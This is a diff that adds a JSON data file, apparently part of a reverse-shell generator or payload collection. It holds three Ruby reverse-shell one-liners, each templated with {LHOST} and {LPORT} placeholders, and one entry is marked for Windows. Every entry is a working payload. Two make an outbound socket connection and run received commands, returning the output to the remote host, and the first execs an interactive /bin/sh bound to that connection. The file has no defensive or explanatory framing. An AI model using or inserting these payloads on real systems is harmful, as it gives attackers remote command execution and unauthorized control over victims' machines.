@@ -1,0 +1,23 @@
+[
+  {
+    "type": "ruby",
+    "direction": "reverse",
+    "payload": "ruby -rsocket -e'f=TCPSocket.open(\"{LHOST}\",{LPORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
+    "note": null,
+    "id": "ruby1"
+  },
+  {
+    "type": "ruby",
+    "direction": "reverse",
+    "payload": "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{LHOST}\",\"{LPORT}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
+    "note": null,
+    "id": "ruby2"
+  },
+  {
+    "type": "ruby",
+    "direction": "reverse",
+    "payload": "ruby -rsocket -e 'c=TCPSocket.new(\"{LHOST}\",\"{LPORT}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
+    "note": "Windows",
+    "id": "ruby3"
+  }
+]
